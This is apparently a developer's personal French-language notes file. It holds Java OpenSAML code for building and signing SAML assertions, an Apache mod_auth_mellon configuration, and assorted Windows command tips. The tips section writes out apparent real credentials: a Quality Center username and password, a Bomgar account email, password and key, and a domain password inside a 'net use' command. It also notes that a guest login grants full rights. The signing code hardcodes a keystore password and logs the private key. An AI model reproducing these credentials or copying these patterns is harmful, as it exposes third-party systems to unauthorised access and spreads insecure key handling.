                                  	         AuthnStatement authnStatement = (AuthnStatement) authStatementBuilder.buildObject();
                                  	         //authnStatement.setSubject(subject);
                                  	         //authnStatement.setAuthenticationMethod(strAuthMethod);
                                  	         DateTime now2 = new DateTime();
                                  	         authnStatement.setAuthnInstant(now2);
                                  	         authnStatement.setSessionIndex(input.getSessionId());
                                  	         authnStatement.setSessionNotOnOrAfter(now2.plus(input.getMaxSessionTimeoutInMinutes()));
                                   
                                  	         SAMLObjectBuilder authContextBuilder = (SAMLObjectBuilder) SAMLWriter.getSAMLBuilder().getBuilder(AuthnContext.DEFAULT_ELEMENT_NAME);
                                  	         AuthnContext authnContext = (AuthnContext) authContextBuilder.buildObject();
                                   
                                  	         SAMLObjectBuilder authContextClassRefBuilder = (SAMLObjectBuilder) SAMLWriter.getSAMLBuilder().getBuilder(AuthnContextClassRef.DEFAULT_ELEMENT_NAME);
                                  	         AuthnContextClassRef authnContextClassRef = (AuthnContextClassRef) authContextClassRefBuilder.buildObject();
                                  	         authnContextClassRef.setAuthnContextClassRef("urn:oasis:names:tc:SAML:2.0:ac:classes:Password"); // TODO not sure exactly about this
                                   
                                  			authnContext.setAuthnContextClassRef(authnContextClassRef);
                                  	        authnStatement.setAuthnContext(authnContext);
                                   
                                  	        // Builder Attributes
                                  	         SAMLObjectBuilder attrStatementBuilder = (SAMLObjectBuilder) SAMLWriter.getSAMLBuilder().getBuilder(AttributeStatement.DEFAULT_ELEMENT_NAME);
                                  	         AttributeStatement attrStatement = (AttributeStatement) attrStatementBuilder.buildObject();
                                   
                                  	      // Create the attribute statement
                                  	         Map attributes = input.getAttributes();
                                  	         if(attributes != null){
                                  	        	 Set keySet = attributes.keySet();
                                  	        	 for (String key : keySet)
                                  				{
                                  	        		 Attribute attrFirstName = buildStringAttribute(key, attributes.get(key), getSAMLBuilder());
                                  	        		 attrStatement.getAttributes().add(attrFirstName);
                                  				}
                                  	         }
                                   
                                  	         // Create the do-not-cache condition
                                  	         SAMLObjectBuilder doNotCacheConditionBuilder = (SAMLObjectBuilder) SAMLWriter.getSAMLBuilder().getBuilder(OneTimeUse.DEFAULT_ELEMENT_NAME);
                                  	         Condition condition = (Condition) doNotCacheConditionBuilder.buildObject();
                                   
                                  	         SAMLObjectBuilder conditionsBuilder = (SAMLObjectBuilder) SAMLWriter.getSAMLBuilder().getBuilder(Conditions.DEFAULT_ELEMENT_NAME);
                                  	         Conditions conditions = (Conditions) conditionsBuilder.buildObject();
                                  	         conditions.getConditions().add(condition);
                                   
                                  	         // Create Issuer
                                  	         SAMLObjectBuilder issuerBuilder = (SAMLObjectBuilder) SAMLWriter.getSAMLBuilder().getBuilder(Issuer.DEFAULT_ELEMENT_NAME);
                                  	         Issuer issuer = (Issuer) issuerBuilder.buildObject();
                                  	         issuer.setValue(input.getStrIssuer());
                                   
                                  	         // Create the assertion
                                  	         SAMLObjectBuilder assertionBuilder = (SAMLObjectBuilder) SAMLWriter.getSAMLBuilder().getBuilder(Assertion.DEFAULT_ELEMENT_NAME);
                                  	         Assertion assertion = (Assertion) assertionBuilder.buildObject();
                                  	         assertion.setIssuer(issuer);
                                  	         assertion.setIssueInstant(now);
                                  	         assertion.setVersion(SAMLVersion.VERSION_20);
                                   
                                  	         assertion.getAuthnStatements().add(authnStatement);
                                  	         assertion.getAttributeStatements().add(attrStatement);
                                  	         assertion.setConditions(conditions);
                                   
                                  			return assertion;
                                  		}
                                  		catch (Exception e)
                                  		{
                                  			e.printStackTrace();
                                  		}
                                  		return null;
                                  	}
                                   
                                  	public static class SAMLInputContainer
                                  	{
                                   
                                  		private String strIssuer;
                                  		private String strNameID;
                                  		private String strNameQualifier;
                                  		private String sessionId;
                                  		private int maxSessionTimeoutInMinutes = 15; // default is 15 minutes
                                   
                                  		private Map attributes;
                                   
                                  		/**
                                  		 * Returns the strIssuer.
                                  		 *
                                  		 * @return the strIssuer
                                  		 */
                                  		public String getStrIssuer()
                                  		{
                                  			return strIssuer;
                                  		}
                                   
                                  		/**
                                  		 * Sets the strIssuer.
                                  		 *
                                  		 * @param strIssuer
                                  		 *            the strIssuer to set
                                  		 */
                                  		public void setStrIssuer(String strIssuer)
                                  		{
                                  			this.strIssuer = strIssuer;
                                  		}
                                   
                                  		/**
                                  		 * Returns the strNameID.
                                  		 *
                                  		 * @return the strNameID
                                  		 */
                                  		public String getStrNameID()
                                  		{
                                  			return strNameID;
                                  		}
                                   
                                  		/**
                                  		 * Sets the strNameID.
                                  		 *
                                  		 * @param strNameID
                                  		 *            the strNameID to set
                                  		 */
                                  		public void setStrNameID(String strNameID)
                                  		{
                                  			this.strNameID = strNameID;
                                  		}
                                   
                                  		/**
                                  		 * Returns the strNameQualifier.
                                  		 *
                                  		 * @return the strNameQualifier
                                  		 */
                                  		public String getStrNameQualifier()
                                  		{
                                  			return strNameQualifier;
                                  		}
                                   
                                  		/**
                                  		 * Sets the strNameQualifier.
                                  		 *
                                  		 * @param strNameQualifier
                                  		 *            the strNameQualifier to set
                                  		 */
                                  		public void setStrNameQualifier(String strNameQualifier)
                                  		{
                                  			this.strNameQualifier = strNameQualifier;
                                  		}
                                   
                                  		/**
                                  		 * Sets the attributes.
                                  		 *
                                  		 * @param attributes
                                  		 *            the attributes to set
                                  		 */
                                  		public void setAttributes(Map attributes)
                                  		{
                                  			this.attributes = attributes;
                                  		}
                                   
                                  		/**
                                  		 * Returns the attributes.
                                  		 *
                                  		 * @return the attributes
                                  		 */
                                  		public Map getAttributes()
                                  		{
                                  			return attributes;
                                  		}
                                   
                                  		/**
                                  		 * Sets the sessionId.
                                  		 * @param sessionId the sessionId to set
                                  		 */
                                  		public void setSessionId(String sessionId)
                                  		{
                                  			this.sessionId = sessionId;
                                  		}
                                   
                                  		/**
                                  		 * Returns the sessionId.
                                  		 * @return the sessionId
                                  		 */
                                  		public String getSessionId()
                                  		{
                                  			return sessionId;
                                  		}
                                   
                                  		/**
                                  		 * Sets the maxSessionTimeoutInMinutes.
                                  		 * @param maxSessionTimeoutInMinutes the maxSessionTimeoutInMinutes to set
                                  		 */
                                  		public void setMaxSessionTimeoutInMinutes(int maxSessionTimeoutInMinutes)
                                  		{
                                  			this.maxSessionTimeoutInMinutes = maxSessionTimeoutInMinutes;
                                  		}
                                   
                                  		/**
                                  		 * Returns the maxSessionTimeoutInMinutes.
                                  		 * @return the maxSessionTimeoutInMinutes
                                  		 */
                                  		public int getMaxSessionTimeoutInMinutes()
                                  		{
                                  			return maxSessionTimeoutInMinutes;
                                  		}
                                   
                                  	}
                                  	
                                  	ET pour signer l'assertion : 
                                  	package com.example.test;
                                   
                                  import java.io.FileInputStream;
                                  import java.io.FileNotFoundException;
                                  import java.io.IOException;
                                  import java.security.KeyStore;
                                  import java.security.KeyStoreException;
                                  import java.security.NoSuchAlgorithmException;
                                  import java.security.PrivateKey;
                                  import java.security.UnrecoverableEntryException;
                                  import java.security.cert.CertificateException;
                                  import java.security.cert.X509Certificate;
                                   
                                  import org.opensaml.Configuration;
                                  import org.opensaml.DefaultBootstrap;
                                  import org.opensaml.saml2.core.Response;
                                  import org.opensaml.saml2.core.impl.ResponseMarshaller;
                                  import org.opensaml.xml.ConfigurationException;
                                  import org.opensaml.xml.io.MarshallingException;
                                  import org.opensaml.xml.security.SecurityConfiguration;
                                  import org.opensaml.xml.security.SecurityHelper;
                                  import org.opensaml.xml.security.credential.Credential;
                                  import org.opensaml.xml.security.x509.BasicX509Credential;
                                  import org.opensaml.xml.signature.Signature;
                                  import org.opensaml.xml.signature.SignatureException;
                                  import org.opensaml.xml.signature.Signer;
                                  import org.opensaml.xml.util.XMLHelper;
                                  import org.slf4j.Logger;
                                  import org.slf4j.LoggerFactory;
                                  import org.w3c.dom.Element;
                                   
                                  public class SignAssertion
                                  {
                                     private final static Logger logger = LoggerFactory.getLogger(SignAssertion.class);
                                     private static Credential signingCredential = null;
                                     final static Signature signature = null;
                                     final static String password = "secret";
                                     final static String certificateAliasName = "selfsigned";
                                     final static String fileName = "C:\\Users\\Narendra\\Desktop\\SAML\\idpcert.jks";
                                   
                                     @SuppressWarnings("static-access")
                                     private void intializeCredentials()
                                     {
                                        KeyStore ks = null;
                                        FileInputStream fis = null;
                                        char[] password = this.password.toCharArray();
                                   
                                        // Get Default Instance of KeyStore
                                        try
                                        {
                                           ks = KeyStore.getInstance(KeyStore.getDefaultType());
                                        }
                                        catch (KeyStoreException e)
                                        {
                                           logger.error("Error while Intializing Keystore", e);
                                        }
                                   
                                        // Read Ketstore as file Input Stream
                                        try
                                        {
                                           fis = new FileInputStream(fileName);
                                        }
                                        catch (FileNotFoundException e)
                                        {
                                           logger.error("Unable to found KeyStore with the given keystoere name ::" + fileName, e);
                                        }
                                   
                                        // Load KeyStore
                                        try
                                        {
                                           ks.load(fis, password);
                                        }
                                        catch (NoSuchAlgorithmException e)
                                        {
                                           logger.error("Failed to Load the KeyStore:: ", e);
                                        }
                                        catch (CertificateException e)
                                        {
                                           logger.error("Failed to Load the KeyStore:: ", e);
                                        }
                                        catch (IOException e)
                                        {
                                           logger.error("Failed to Load the KeyStore:: ", e);
                                        }
                                   
                                        // Close InputFileStream
                                        try
                                        {
                                           fis.close();
                                        }
                                        catch (IOException e)
                                        {
                                           logger.error("Failed to close file stream:: ", e);
                                        }
                                   
                                        // Get Private Key Entry From Certificate
                                        KeyStore.PrivateKeyEntry pkEntry = null;
                                        try
                                        {
                                           pkEntry = (KeyStore.PrivateKeyEntry) ks.getEntry(this.certificateAliasName, new KeyStore.PasswordProtection(
                                                    this.password.toCharArray()));
                                        }
                                        catch (NoSuchAlgorithmException e)
                                        {
                                           logger.error("Failed to Get Private Entry From the keystore:: " + this.fileName, e);
                                        }
                                        catch (UnrecoverableEntryException e)
                                        {
                                           logger.error("Failed to Get Private Entry From the keystore:: " + this.fileName, e);
                                        }
                                        catch (KeyStoreException e)
                                        {
                                           logger.error("Failed to Get Private Entry From the keystore:: " + this.fileName, e);
                                        }
                                        PrivateKey pk = pkEntry.getPrivateKey();
                                   
                                        X509Certificate certificate = (X509Certificate) pkEntry.getCertificate();
                                        BasicX509Credential credential = new BasicX509Credential();
                                        credential.setEntityCertificate(certificate);
                                        credential.setPrivateKey(pk);
                                        signingCredential = credential;
                                   
                                        logger.info("Private Key" + pk.toString());
                                   
                                     }
                                   
                                     public static void main(String args[]) throws Exception
                                     {
                                        SignAssertion sign = new SignAssertion();
                                        sign.intializeCredentials();
                                        Signature signature = null;
                                        try
                                        {
                                           DefaultBootstrap.bootstrap();
                                        }
                                        catch (ConfigurationException e)
                                        {
                                           // TODO Auto-generated catch block
                                           e.printStackTrace();
                                        }
                                        signature = (Signature) Configuration.getBuilderFactory().getBuilder(Signature.DEFAULT_ELEMENT_NAME)
                                                 .buildObject(Signature.DEFAULT_ELEMENT_NAME);
                                   
                                        signature.setSigningCredential(signingCredential);
                                   
                                        // This is also the default if a null SecurityConfiguration is specified
                                        SecurityConfiguration secConfig = Configuration.getGlobalSecurityConfiguration();
                                        // If null this would result in the default KeyInfoGenerator being used
                                        String keyInfoGeneratorProfile = "XMLSignature";
                                   
                                        try
                                        {
                                           SecurityHelper.prepareSignatureParams(signature, signingCredential, secConfig, null);
                                        }
                                        catch (SecurityException e)
                                        {
                                           e.printStackTrace();
                                        }
                                        catch (org.opensaml.xml.security.SecurityException e)
                                        {
                                           // TODO Auto-generated catch block
                                           e.printStackTrace();
                                        }
                                   
                                        Response resp = SAMLWriter.getSamlAssertion();
                                   
                                        resp.setSignature(signature);
                                   
                                        try
                                        {
                                           Configuration.getMarshallerFactory().getMarshaller(resp).marshall(resp);
                                        }
                                        catch (MarshallingException e)
                                        {
                                           e.printStackTrace();
                                        }
                                   
                                        try
                                        {
                                           Signer.signObject(signature);
                                        }
                                        catch (SignatureException e)
                                        {
                                           e.printStackTrace();
                                        }
                                   
                                        ResponseMarshaller marshaller = new ResponseMarshaller();
                                        Element plain = marshaller.marshall(resp);
                                        // response.setSignature(sign);
                                        String samlResponse = XMLHelper.nodeToString(plain);
                                        logger.info("********************\n*\n***********::" + samlResponse);
                                   
                                     }
                                  }
      mise en place de mod_mellon (phil utilise mod_shib) pour mettre du saml au niveau d'apache et non pas applicatif:
                Pour generer les metadata
                	/usr/libexec/mod_auth_mellon/mellon_create_metadata.sh http://solis.vinci-concessions.net/edsn http://solis.vinci-concessions.net/mellon
                
                Dans les metadata generees, rajout de la ligne NameIDFormat, et changement de http en https pour ce qui pointe vers notre appli
                
                <EntityDescriptor entityID="https://solis.vinci-concessions.net/edsn" xmlns="urn:oasis:names:tc:SAML:2.0:metadata" xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
                  <SPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
                    <KeyDescriptor use="signing">
                      <ds:KeyInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
                        <ds:X509Data>
                          <ds:X509Certificate>MIICyDCCAbACCQDu3zZqN6kc0TANBgkqhkiG9w0BAQUFADAmMSQwIgYDVQQDExtz
                b2xpcy52aW5jaS1jb25jZXNzaW9ucy5uZXQwHhcNMTcwNjE1MTIzODU4WhcNMjcw
                +5SUS7kXLgSSJz4vZ/1s=</ds:X509Certificate>
                        </ds:X509Data>
                      </ds:KeyInfo>
                    </KeyDescriptor>
                    <SingleLogoutService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="https://solis.vinci-concessions.net/mellon/logout"/>
                    <NameIDFormat>urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified</NameIDFormat>
                    <AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://solis.vinci-concessions.net/mellon/postResponse" index="0"/>
                  </SPSSODescriptor>
                </EntityDescriptor>
                
                
                Le vhost apache correspondant (il y a notre Pleiades, espace dsn et extension dsn dans le meme donc c'est brouillon)
                :
                
                <VirtualHost *:8045>
                    ServerName solis.vinci-concessions.net
                    ErrorLog logs/solis.vinci-concessions.net-error_log
                    CustomLog logs/solis.vinci-concessions.net-access_log common
                
                
                SSLEngine On
                SSLProxyEngine On 
                
                SSLCertificateFile /etc/ssl/certs/solis.vinci-concessions.net.self.crt
                SSLCertificateKeyFile /etc/ssl/private/solis.vinci-concessions.net.self.key
                
                RedirectMatch ^/$ /pleiades/
                
                ProxyPreserveHost On
                ProxyRequests Off
                
                RewriteEngine On
                
                ProxyPass /pleiades http://localhost:8092/pleiades ProxyPassReverse /pleiades http://localhost:8092/pleiades   voir LINKpppassorder
                
                ProxyPass /rescue http://localhost:8092/rescue ProxyPassReverse /rescue http://localhost:8092/rescue
                
                ProxyPass /pta http://localhost:8092/pta ProxyPassReverse /pta http://localhost:8092/pta
                
                ProxyPass /generatedApp http://localhost:8092/generatedApp
                ProxyPassReverse /generatedApp http://localhost:8092/generatedApp
                
                ProxyPass /edsn http://localhost:8183/edsn ProxyPassReverse /esdn http://localhost:8183/edsn
                
                ProxyPass /dsn-rescue http://localhost:8092/dsn-rescue ProxyPass /dsn-rescue http://localhost:8092/dsn-rescue
                
                ProxyPass /dsn http://localhost:8092/dsn ProxyPassReverse /dsn http://localhost:8092/dsn
                
                <Location /dsn>
                        MellonSPPrivateKeyFile /etc/ssl/private/http_solis.vinci_concessions.net_dsn.key
                        MellonSPCertFile /etc/ssl/certs/http_solis.vinci_concessions.net_dsn.cert
                        MellonSPMetadataFile /etc/httpd/http_solis.vinci_concessions.net_dsn.xml
                
                        MellonEndpointPath /mellon
                        MellonSessionDump on
                        MellonSamlResponseDump on
                        MellonSecureCookie On
                        MellonIdpMetadataFile   /etc/httpd/authentic-metadata.xml
                        MellonEnable "auth"
                        RequestHeader unset SAML_ID
                        RequestHeader set SAML_ID "%{MELLON_VINCIID}e"
                </Location>
                
                <Location />
                        MellonSPPrivateKeyFile /etc/ssl/private/http_solis.vinci_concessions.net_pleiades.key
                        MellonSPCertFile /etc/ssl/certs/http_solis.vinci_concessions.net_pleiades.cert
                        MellonSPMetadataFile /etc/httpd/http_solis.vinci_concessions.net_pleiades.xml
                
                        MellonEnable "info"
                        MellonEndpointPath /mellon
                	MellonSessionDump on
                	MellonSamlResponseDump on
                        MellonSecureCookie On
                        MellonIdpMetadataFile   /etc/httpd/authentic-metadata.xml
                </Location>
                
                <Location /pleiades>
                        MellonEnable "auth"
                        RequestHeader unset SAML_ID
                        RequestHeader set SAML_ID "%{MELLON_VINCIID}e"
                </Location>
                
                <Location /rescue>
                        MellonEnable "off"
                </Location>
                
                <Location /edsn>
                        MellonSPPrivateKeyFile /etc/ssl/private/http_solis.vinci_concessions.net_edsn.key
                        MellonSPCertFile /etc/ssl/certs/http_solis.vinci_concessions.net_edsn.cert
                        MellonSPMetadataFile /etc/httpd/http_solis.vinci_concessions.net_edsn.xml
                
                        MellonEndpointPath /mellon
                        MellonSessionDump on
                        MellonSamlResponseDump on
                        MellonSecureCookie On
                        MellonIdpMetadataFile   /etc/httpd/authentic-metadata.xml
                        MellonEnable "auth"
                        RequestHeader unset SAML_ID
                        RequestHeader set SAML_ID "%{MELLON_VINCIID}e"
                </Location>
                
                <Location /dsn-recue>
                        MellonEnable "off"
                </Location>
                
                <Location /pta/pages/PTAConnexion.jsp>
                	Order deny,allow
                	Deny from all
                </Location>
                
                </VirtualHost>
                
                
                
                
                Ne pas oublier de declarer les metadata de l'appi dans le fournisseur d'identite, et normalement c'est a peu près tout :-)
                
                N'hesite pas si besoin de precisions.
                
                Au plaisir,
                
                Mathieu
                
pour recuperer les rôles de l'utilisateur qui s'est connecté côté IDP:
      voici dans l'assertion SAML en provenance de l'IDP ce que je peux avoir
      <saml:AttributeStatement>
            <saml:Attribute Name="uid" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
              <saml:AttributeValue xsi:type="xs:string">test</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="mail" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
              <saml:AttributeValue xsi:type="xs:string">test@example.com</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="eduPersonAffiliation" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
              <saml:AttributeValue xsi:type="xs:string">users</saml:AttributeValue>
              <saml:AttributeValue xsi:type="xs:string">examplerole1</saml:AttributeValue>
            </saml:Attribute>
        ou
            <Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/givenname">
                <AttributeValue>Mohamed</AttributeValue>
            </Attribute>
          <Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/surname">
                <AttributeValue>Khelifa</AttributeValue>
          </Attribute>
    </saml:AttributeStatement>
  voici côté SP comment les extraire avec opensaml:            
        //loop through the nodes to get what we want
        org.opensaml.saml2.core.Assertion decryptedAssertion=......
        List<AttributeStatement> attributeStatements = decryptedAssertion.getAttributeStatements();
        for (int i = 0; i < attributeStatements.size(); i++)
        {
        List<Attribute> attributes = attributeStatements.get(i).getAttributes();
        for (int x = 0; x < attributes.size(); x++)
        {
        String strAttributeName = attributes.get(x).getDOM().getAttribute("Name");
        
        List<XMLObject> attributeValues = attributes.get(x).getAttributeValues();
        for (int y = 0; y < attributeValues.size(); y++)
        {
        String strAttributeValue = attributeValues.get(y).getDOM().getTextContent();
        System.out.println(strAttributeName + ": " + strAttributeValue);
        }
        }
        }                
        
windows : (commande dos :)
raccourci creer un nouveau dossier : ctrl+shift+n
window+x ouvre des options de luminosité
impression ecran : 
        alt+impressionecran copie que la fenetre active. Sinon on peut utiliser Greenshot
Test Director : (quality center)
http://qc92.intra.renault.fr/qcbin
ne marche que mon compte p036782 (je peux me connecter avec guest/sans mot de passe pour avoir tous les droits!)
domain: RS3Minute
user: p036782
pass: rcwdr2
quand on corrige une ano: passer l'ano au statut "Corrige" + mettre un commentaire
nos etats: on recoit "Assigne" --on le met à -->Corrige ou Refuse
pour importer un DRP dans test director:
ouvrir le DRP.xls et le fichier de prima selectionner toute la page testplan dans prima et tous supprimer copier tout dans DRP sur Testplan dans prima del les logos del ligne 19 lancer macros
quand toutes les macros ont ete ok: 
1: insert colomne Application (en rouge)
Copier l'application partout (recuperee de TD
mettre dans la colomne Subject le nom du path vers le repertoire
selectionner toutes les valeurs sauf l'en tete 
faire tool > export to quality center : copier l'adresse html que jusqu'à  "qcbin"
renseigner newmapname: toto on s'en fout
Faire le mapping
dans TD test plan renommer les MÂ° en mettant un "0" avant pour que ce soit bien trie. 

bomgar pour assistance a distance partager ecran bureau a distance
      laurent.duverge@soprahr.com/Cadreras123%
      ACCD84CB-A3C6174A-DD4C3CDF-6D060D4F
baretail pour voir les logs défiler sur windows ou encore mieux utiliser le terminal de mobaxterm avec un tail
explorer ne plus regrouper l'affichage : affichage>group by > none
    explorer focus bare adresse address Alt+a ou Alt+d
                focus fichiers: Alt+fleches droite puis gauche
    pour libérer de l'espace memoire:
    pagefile.sys est le fichier de swap
      on peut reduire sa taille... pas encore vu.
    hiberfil.sys est un fichier utilise pour la veille. on peut le parametre pour qu'il degage 
      avec la commande cmd : powercfg -h off // desactiver
                             powercfg -h on // reactiver
      
        pour me connecter à une bureau connexion machine distante distance en VM sur le reseau
            mstsc BCNSSRV1131 (ou faire mstsc tout seul d'abord puis ensuite mettre l'url dans la fenetre)
         (pour monter un disque reseau sur K:)
         net use K: \\F-horus\shared\P-odp\odp\RS3_Minute\_Partage_Transversal\Projets\ANT_Delivery_2.0.0\ /user:CORP\p036782 rcwdr1
         si erreur syntax error 67 ou autre: essayer avec moins de repertoires et avec ou sans antislash à la fin du chemin
         pour supprimer un net use : 
           net use K: /delete pour demonter un lecteur reseau
           net use (tout court) pour voir les montages

             
  pour savoir quel process windows empleche les fichiers verouillent repertoires directory: programme processexplorer (D:\Dev\ProcessExplorer)
    faire Ctrl+f et tapper le nom du fichier/repertoire puis entree 
pour que windows7 recherche aussi dans le contenu des fichiers:
    Explorateur>option Dossiers > onglet rechercher > choisir Rechercher les noms .. et leur contenus. Conseil decocher rechercher les corresp partielles et quand je recherche mettre les guillemets autour
      les polices, les font, les .ttf sont sous :
        C:\WINDOWS\Fonts
      echo $MANPATH = pour voir ou est le repertoire d'aide
      r pr pour ??? 
      Recherche rapide dans explorateur windows: F3
      variables d'environnement: pour definir une nouvelle appli( ant ou symfony)
      il faut que dans variables d'env windows: definir 
      variables systeme: 
      nom variable: ANT_HOME
      valeur variable: C:\outils\apache-ant-1.7.0
      
      nom variable: JAVA_HOME
      valeur variable: C:\Program Files\Java\jdk1.5.0_07
      ou C:\Program Files\JavaSoft\JRE\1.5.0_12
      set JAVA_HOME=C:\Program files/JavaSoft/JRE/1.5.0_08
      
      puis dans variable utilisateur: 
      nom varialb: PATH
      valeur variable: %JAVA_HOME%\bin;%ANT_HOME%\bin
      puis dans CMD: 
      C:\>echo %ANT_HOME%
pour savoir quelle est ma carte mère
  executer windows>msinfo32


afficher les extensions dans l'explorateur
    organize >folder and search option >view etc...
voir les variables d'environnement
  SET
empecher redimensionnement fenetres 
    panneau de conf > souris
pour faire un clear clean de la console : 
      cls
pour faire un e accent aigu ou circonflexe majuscule : 
      É = Alt + 144 
      Ê = Alt + 210 
      Î = Alt + 0206
pour faire un a accent grave majuscule :      
      À = Alt + 183 
      È = Alt + 0200
windows+"+" ou windows + "-": loupe loop zoom puis Ctrl + alt + fleches pour bouger 
journal des evenements : 
    Win+R puis %SystemRoot%\system32\eventvwr.msc
commande dos pour voir les ports utilises sur mon ordi: netstat (netstat -a -n -o voir netstat plus haut)
les alias: c a d le nom des serveurs et adresse ip sont a definir dans C:/WINNT/system32/drivers/etc/hosts // a la modif il prend en compte tout de suiteLINKàç<çç_à
pour demarrer une appli en mode admin: dans le raccourci mettre : 
      C:\WINDOWS\system32\runas.exe /user:admin /savecred  "C:\jbdevstudio4\studio\jbdevstudio.exe"
      ou bien demarrer l'appli en appuyant sur Ctrl+Shift
pour avoir l'explorer en mode admin :
      %WINDIR%\system32\runas.exe /user:admin /savecred "%WINDIR%\explorer.exe /separate"
      %WINDIR%\system32\runas.exe /user:CORP\awclsc1 /savecred "%WINDIR%\explorer.exe /separate"
pour demarrer un windows virtuel : 
  demarrer programme Microsoft Virtual PC après avoir dezippe quelquepart un xxxx.vhd et un xxx.vmc
pour avoir bcp de droits d'amin 
  possible repertoire>proprietes>securite>ajouter utilisateur> control total
  ou/et
  se connecter en admin > parametres> comptes utilisateur > declarer un utilisateur comme admin
pour changer de langue clavier raccourcis:
  windows+espace puis fleches      
pour se donner les droits d'admin sur un dossier et ses fils :
    click droit du dossier proprietes>choisir le USER en haut (le dernier) >cocher control total 
    puis Parametres avances > cocher la case en bas "remplacer heritage blabla..." valider le tout.
Pour partitionner ses disques utiliser PQMAGIC
pour voir mon adresse IP: 
    executer menu demarer> executer> tapper cmd dans la fenetre dos tapper ipconfig (commande windows. Equivalent linux = ifconfig)
pour en plus voir l'adresse mac de ma machine:
      >ipconfig /all     //apparait sous Carte Ethernet connexion au reseau local (ouCarte réseau sans fil Connexion réseau sans fil) > Adresse physique
pour connaitre mon domaine, mon dns et d'autres infos : ipconfig/all
        C:\Documents and Settings\Administrator>ipconfig/all
                              Configuration IP de Windows
                                      Nom de l'hôte . . . . . . . . . . : FR20108941
                                      Suffixe DNS principal . . . . . . : corp.noxiane.net // c'est mon domaine
                                      Type de noud . . . . . . . . . . : Hybride
                                      Routage IP active . . . . . . . . : Non
                                      Proxy WINS active . . . . . . . . : Non
                                      Liste de recherche du suffixe DNS : ddns.pls.renault.fr // les DNS que mon pc peut interroger 
                                                                          corp.noxiane.net
                                                                          pls.renault.fr
                                                                          tpz.renault.fr
                                                                          renault.fr
                                                                          noxiane.net
                              Carte Ethernet Local Area Connection:
                                      Suffixe DNS propre à la connexion : ddns.pls.renault.fr
                                      Description . . . . . . . . . . . : Broadcom NetXtreme Gigabit Ethernet
                                      Adresse physique . . . . . . . . .: 64-31-50-2A-30-FC
                                      DHCP active. . . . . . . . . . . : Oui
                                      Configuration automatique activee . . . . : Non
                                      Adresse IP. . . . . . . . . . . . : 10.230.213.230
                                      Masque de sous-reseau . . . . . . : 255.255.240.0
                                      Passerelle par defaut . . . . . . : 10.230.223.254
                                      Serveur DHCP. . . . . . . . . . . : 138.21.106.119
                                      Serveurs DNS . . . . . . . . . .  : 138.21.151.138
                                                                          138.21.89.121
                                      Serveur WINS principal. . . . . . : 138.21.46.130
                                      Serveur WINS secondaire . . . . . : 138.21.29.70
                                      Bail obtenu . . . . . . . . . . . : mercredi 29 août 2012 09:40:25
                                      Bail expirant . . . . . . . . . . : samedi 8 septembre 2012 09:40:25
les hosts pour simuler overrider les DNS sont sur : ouvrir avec notepad en mode admin si pas possible sauver voir aussi LINKàç<çç_à 
        C:/WINDOWS/system32/drivers/etc/hosts (attention un seul espace ou un seul tab entre ip et url)
              si par ex les DSN ne sont pas encore declares sur le net je peux faire comme si on ajoutant dans ce fichier:  utile pour tester la migration serveur avant la migration dns reele (voir seo: pas d'interruption de service)
              adresseIPdestination urlDeTypetoto.titi.tata  /donc quand moi je vais sur urlDeTypetoto.titi.tata il va sur adresseIPdestination meme si c pas encore defini sur le reseau
               si marche pas faire ipconfig /flushdns (sur windows) // vide memoire cache
                                verifier que l'ip est bien associe avec ping www.example.com -n 1
                                                                              ping -6 ipv6.example.com -n 1
acceder aux drivers gestionnaire de peripheriques sous windows 8: 
    faire une recherche dans menu demarer : gestionnaire peripheriques
pour installer un driver
       le mieux c daller dans le gestionnaire des taches trouver le driver qui va pas et faire mettre à jour et si on a le driver en local choisir son repertoire et go    
pour avoir la liste des taches (control alt suppr; ctrl alt suppr): 
  lancer cmd puis tapper taskmgr
  pour touch metre à jour la date des fichiers *.jsp à la date du jour: 
	         COPY /B *.jsp +,,
  pour supprimer de facon recursive des fichiers avec une expression reguliere
    de là ou je suis il supprime: 
        del /s *.MF (il supprime tous les fichiers *.MF recursivement)
      pour copier le nom de plusieurs fichiers: nom des fichiers
          aller en commande dos
      raccourcis clavier: http://www.infoprat.net/astuces/windows9x/astuces/raccourcis_015.php
      demarrer une application de la barre des taches : Windows + T
      Acceder à une application : Alt+Tab puis les fleches
      Pour reduire une fenêtre, appuyez sur ALT+ Espace + N.
      pour retourner sur bureau: windows + D
      pour enregistrer sous : ctrl+d
      Faire une recherche : Windows+F
      lancer l'execution : Windows+R
      pour empecher windows de s'eteindre: demarrer > executer > shutdown -a
      commande msdos: net use /? (aide) pour monter un disque
      			net use y: \\f-sobek\p-odp
      			net use y: \\CPTTPD2BURV7.zgie.ztech
      			
      nomenclature Nommage des docs: chrono sur Z:\p036782\MyShared\rs3_ged\Documentation_Applicative_RS3\RS3M
      
      
      pour savoir quel processus se cache derriere un processus svchost.exe et si il est nefaste:
      sur cmd tapper: tasklist /svc /fi "imagename eq svchost.exe
      table de registres: base de registres
      puis lancer regedit, et naviger jusqu'a la cle: HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LEFAMEUX SERVICE
      La valeur DisplayName vous donnera le nom exact du service.
      lancer le gestionnaire de service:  services.msc on y retrouvera le nom exact.
      lancer msconfig et on pourra savoir si c'est un service windows ou pas

windows8 : 
  pour modifier les services au demarrage : 
  Ctlr+R puis %AppData% mais le chemin pour y arriver c'est : C:\Users\Laurent\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    on peut voir le resultat des services qui se lancent au demarrage en faisant: ctlr+alt+sup puis onglet demarrage
les ear sont planques sur was 2 sous: 
/srvappli/wacint20/logiciel/was/apps5/installedApps/wndint01/

envoismoinscher : 
    pli
    20*20cm        
prestashop :
      vider les tables trop grosses :
            delete from ps_connections where YEAR(date_add) <2017 and date_add != '2015-08-07 20:55:43';
